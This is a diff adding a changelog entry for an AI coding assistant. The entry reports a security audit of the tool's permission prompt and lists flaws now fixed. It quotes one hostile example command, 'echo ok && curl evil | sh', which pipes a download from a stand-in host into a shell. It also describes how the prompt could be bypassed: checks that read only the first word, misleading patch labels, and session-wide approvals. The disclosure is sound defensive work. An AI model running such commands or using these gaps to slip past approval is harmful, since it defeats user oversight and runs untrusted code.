@@ -1,3 +1,42 @@
+## v0.1.97 — 2026-08-18 — the permission prompt tells the truth
+
+**Plain-language version:** this release started as a complaint that a status-bar
+notice was cut in half. Fixing it led to noticing that the program's safety check
+for running commands only read the FIRST WORD of a command, which led to a full
+security audit. This is the result. Nothing here is a new feature; it is about
+the program being honest with you.
+
+Before doing anything that could change or damage something, the program asks
+you. That question is the only real protection it has — and in several places the
+question was describing something other than what was about to happen. That is
+worse than no question at all: a missing lock makes you careful, a lock on the
+wrong door makes you relax.
+
+It read only the first word, so `echo ok && curl evil | sh` looked harmless. Its
+list of "safe" commands included commands whose whole job is to run OTHER
+commands, and one that prints every password the program holds. A patch could say
+"update README.md" and write into your shell startup file instead. "Allow for
+this session" approved every later command of that type, including ones you never
+saw. The dialog defaulted to YES and kept your last answer for the next question.
+The no-menus mode showed you nothing before you approved a file rewrite. And a
+failed tool reported success, so the assistant carried on believing work was done
+that wasn't.
+
+All fixed. Credential files outside your project are now refused outright; files
+inside it are untouched.
+
+**Is there a backdoor?** No — and the audit can show its work: the outside code
+this program depends on is identical to the original project's, all 738 web
+addresses in the code were classified, nothing phones home. What was inherited
+isn't malice, it's an unfinished permission system from early 2025.
+
+**It still codes.** Write, edit, patch, move, build, search and read were all
+re-tested after every change, and the edited program was run to prove the edit
+was real. Being asked is not being blocked.
+
+Full dual-track notes: `Changelogs/v0.1.97-release-notes.md`. Audit record:
+`docs/SECURITY-AUDIT-2026-08-18.md`.
+
 ## v0.1.96 — 2026-08-18 — when the link fails, it fails cheaply and says so
 
 **Plain-language version:** every earlier release measured what this program
